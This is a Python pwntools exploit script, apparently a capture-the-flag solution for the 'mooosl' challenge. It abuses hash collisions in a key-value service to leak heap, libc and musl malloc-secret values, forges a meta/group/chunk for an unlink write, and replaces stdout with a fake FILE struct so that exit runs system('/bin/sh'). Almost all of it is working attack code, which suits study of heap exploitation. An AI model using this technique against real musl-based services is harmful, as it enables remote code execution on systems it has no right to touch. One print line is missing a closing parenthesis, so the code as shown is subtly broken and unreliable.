#!/usr/bin/env python3
from pwn import *
import sys

## The exploit takes "remote" and "noaslr" as optional args

if 'remote' in sys.argv:
	host = 'mooosl.challenges.ooo'
	port = 23333
	r = remote(host, port)
else:
	host = '127.0.0.1'
	port = 15000
	r = remote(host, port)

def compute_hash(stringa):
    v4 = 2021
    for i in range(len(stringa)):
        v4 = ((0x13377331 * v4) + ord(stringa[i])) & 0xffffffffffffffff;
    return v4

def store(len_key, key, len_value, value):
    r.recvuntil("option: ")
    r.sendline("1")
    r.recvuntil("key size: ")
    r.sendline(str(len_key))
    r.recvuntil("key content: ")
    if key != '':
        r.send(key)
    r.recvuntil("value size: ")
    r.sendline(str(len_value))
    r.recvuntil("value content: ")
    r.send(value)

def query(len_key, key):
    r.recvuntil("option: ")
    r.sendline("2")
    r.recvuntil("key size: ")
    r.sendline(str(len_key))
    r.recvuntil("key content: ")
    r.send(key)
    len_value = r.recvuntil(":")[:-1]
    value = r.recvuntil("\n")[:-1]
    return len_value, value

def delete(len_key, key):
    r.recvuntil("option: ")
    r.sendline("3")
    r.recvuntil("key size: ")
    r.sendline(str(len_key))
    r.recvuntil("key content: ")
    r.send(key)

def crafta_chunk(len_key, key_ptr, len_value, value_ptr, key):
    dato = b""
    dato += p64(key_ptr)
    dato += p64(value_ptr)
    dato += p64(len_key)
    dato += p64(len_value)
    dato += p64(compute_hash(key))
    dato += p64(0)
    assert(b"\n" not in dato)
    return dato

## takes the leak and reverses the pointer
# e.g. gira_pointer("878562") == "628587"
def gira_pointer(a):
    return ''.join([str(a[i:i+2])[2:-1] for i in reversed(range(0,len(a),2))])

########################### EXPLOIT STARTS HERE ###########################

key1 = 'a'*5 + "afl"
key2 = 'a'*5 + "aaa"  ## &0xfff collide with key1

store(3, "aab", 0x30 , "z"*0x30)
store(3, "aac", 0x30 , "z"*0x30)
store(3, "aad", 0x30 , "z"*0x30)
store(len(key1), key1, 0x30, "b"*0x30)
store(len(key2), key2, 0x30, "c"*0x30)
delete(3, "aab")
delete(3, "aac")
delete(3, "aad")
delete(len(key1), key1)
# query(8, "x"*8)
store(3, "aae", 0x30 , "z"*0x30)
store(3, "aaf", 0x30 , "z"*0x30)
store(3, "aah", 0x30, "p"*0x30)  # Goes into key1's value field

#### Leaking 1 heap + 1 libc addresses
len_leak, leak = query(len(key1), key1)
addr1 = int('0x'+gira_pointer(leak[:8*2]), 16) # heap
addr2 = int('0x'+gira_pointer(leak[8*2:8*4]), 16) # libc

# Cleaning the previous allocations
delete(len(key2), key2)
delete(3, "aae")
delete(3, "aaf")
delete(3, "aah")

## Setting the heap for an arbitrary read
key01 = ''
key02 = p64(2296).rjust(0x30, b"0") ## &0xfff collide with key01
store(len(key01), key01, 0x30, "b"*0x30)
store(len(key02), key02, 7, "content")
delete(len(key01), key01)
store(8, "qwerqwer", 8, "asdfasdf")

#### Leaking the malloc ctx's secret
addr2_mio = 0x7ffff7ffea60 # my 
ctx = 0x7ffff7ffbac0
offset = addr2_mio-ctx
ctx_vero = addr2 - offset
## I craft a fake chunk in the value of this chunk
# the value of the fake chunk points to the ctx
# the fake chunk can be queried with key ''
store(0x30, "AAAA\n", 0x30, crafta_chunk(0, 0, 0x30, ctx_vero, ''))

# Here's the query that leaks the secret
q = ''
len_ctx, secret_leak = query(len(q), q)
secret = int('0x'+gira_pointer(secret_leak[:8*2]), 16)

print("Leak addr1: " + hex(addr1))   # Heap Pointer
print("Leak addr2: " + hex(addr2))   # Libc Pointer
print("Leak secret: " + hex(secret)) # Malloc ctx secret

############################## END OF THE LEAKS ##############################

## Now we're ready to write
## We allocate a big chunk such that we can place the secret
## at the beginning of a new page
## Then we create a fake meta, a fake group and a fake chunk
## when we free the fake chunk we cause an unlink with prev and next of the meta
## we can basically use prev and next of the chunk to write pointers in memory
## To conclude the exploit we overwrite the ptr to stdout with a pointer
## to a fake file struct that we include in one chunk of ours
## we overwrite the address of the fseek function and the address of the filepointer with /bin/sh\x00
## since the exit calls fseek(file_ptr), we will call system("/bin/sh\x00") on exit!


def craft_meta(prev_, next_, group_ptr):
    meta = p64(prev_)
    meta += p64(next_)
    meta += p64(group_ptr)
    meta += p64(0x000000003ffffffe)
    meta += p64(0x000010000000003d)
    return meta

def craft_group_con_slot_len3(meta_ptr):
    group = p64(meta_ptr)
    group += p64(0x0000a0000000001d)
    group += p64(0x414141)
    group += p64(0x0000000000000009) ##maybe we didn't need it, just in case...
    return group

def crea_fake_file_struct(libc_base, gadget):
    io_file = b""
    io_file += b"/bin/sh\x00" # flags
    io_file += p64(1) # p64(0) # rpos
    io_file += p64(0) # rend
    io_file += p64(libc_base + 0x05C9A0) # close
    io_file += p64(0) # wend
    io_file += p64(0) # wpos
    io_file += p64(0) # mustbezero_1
    io_file += p64(0) # read
    io_file += p64(libc_base + 0x5CCC0) # write
    io_file += p64(gadget) # p64(libc_base + 0x5CB80) # seek
    io_file += p64(gadget) # we saw that this was actually called (?), need to double check 
    io_file += p64(libc_base + 0xB5708) # buf
    io_file += p64(1024) # buf_size
    io_file += p64(0) # prev
    io_file += p64(0) # next
    io_file += p32(1) # fd
    io_file += p32(0) # pipe_fd
    io_file += p64(0) # lockcount
    io_file += p32(0) # mode
    io_file += p32(0xFFFFFFFF) # lock
    io_file += p64(0xB) # lbf # p64(0xA) # lbf
    io_file += p64(0) # cookie
    io_file += p64(0) # off
    io_file += p64(0) # getln_buf
    io_file += p64(0) # mustbezero_2
    io_file += p64(0) # shend
    io_file += p64(0) # shlim
    io_file += p64(0) # shcnt
    io_file += p64(0) # prev_locked
    io_file += p64(0) # next_locked
    io_file += p64(0) # locale
    return io_file

# my addr of the mega chunk
inizio_mega_cosa_mio = 0x7ffff7f3f020
offset_mega_cosa = inizio_mega_cosa_mio - addr2_mio

if "noaslr" in sys.argv:
    inizio_mega_cosa = addr2 + offset_mega_cosa # con ASLR non ci sono [vvar] e [vdso]
else:
    inizio_mega_cosa = addr2 + offset_mega_cosa + 0x6000 # con ASLR non ci sono [vvar] e [vdso]

## Computing some addresses here
indirizzo_pagina = inizio_mega_cosa + 4096 & (-4096)
pad = indirizzo_pagina - inizio_mega_cosa
indirizzo_meta = indirizzo_pagina + 0x18
indirizzo_gruppo = indirizzo_meta + 0x28
indirizzo_chunk = indirizzo_gruppo + 0x10
indirizzo_file = indirizzo_chunk + 0x10

libc_base_mio = 0x7ffff7f47000
libc_base_offset = addr2_mio - libc_base_mio
libc_base = addr2 - libc_base_offset
stdout = libc_base + 0x000B43B0
system_ = libc_base + 0x050A90

gadget = system_

## indirizzo means address. inizio means start. cosa means thing. mio means mine.
## we were using italian, yes...
print('inizio_mega_cosa_mio:', hex(inizio_mega_cosa_mio))
print('offset_mega_cosa:', hex(offset_mega_cosa))
print('inizio_mega_cosa:', hex(inizio_mega_cosa))
print('indirizzo_pagina:', hex(indirizzo_pagina))
print('indirizzo_meta:', hex(indirizzo_meta))
print('indirizzo_gruppo:', hex(indirizzo_gruppo))
print('indirizzo_chunk:', hex(indirizzo_chunk))
print('indirizzo_file:', hex(indirizzo_file))
print('libc_base_offset:', hex(libc_base_offset))
print('libc_base:', hex(libc_base))
print('stdout:', hex(stdout))
print('system:', hex(system_)
# if debugging, with gdb you might want to break here and check
print('break_here:', hex(libc_base + 0x5ca14))

## reasoning on unlink's logic when the meta gets freed
# write "next" in *(prev+8)
# m->prev->next = m->next;
# write "prev" in *(next+0)
# m->next->prev = m->prev;

# next = victim = stdout
# prev = what = struct in heap
# *stdout = struct in heap
# *(struct in heap+8) = stdout

prev_ = indirizzo_file
next_ = stdout

## creating the mega chunk. It contains the secret at the beginning 
## of a new page, the fake meta+group+chunk, the fake file struct
len_mega = 8000
mega_cosa = b"Q"*pad
mega_cosa += p64(secret)
mega_cosa += p64(0)
mega_cosa += p64(0)
mega_cosa += craft_meta(prev_, next_, indirizzo_gruppo) + craft_group_con_slot_len3(indirizzo_meta)
mega_cosa += crea_fake_file_struct(libc_base, gadget)
mega_cosa = mega_cosa.ljust(len_mega, b"V")

## this action sets up the chunks in the right places and then we free 
## '' to get indirizzo_chunk (the little fake chunk) freed
delete(len("AAAA\n"), "AAAA\n")
store(0x30, crafta_chunk(0, 0, 0x3, indirizzo_chunk, ''), len_mega, mega_cosa)

delete(0,'') # triggers the write with the unlink!

## We just use interactive: from here you press 4 for the Exit and you get a shell!
r.interactive()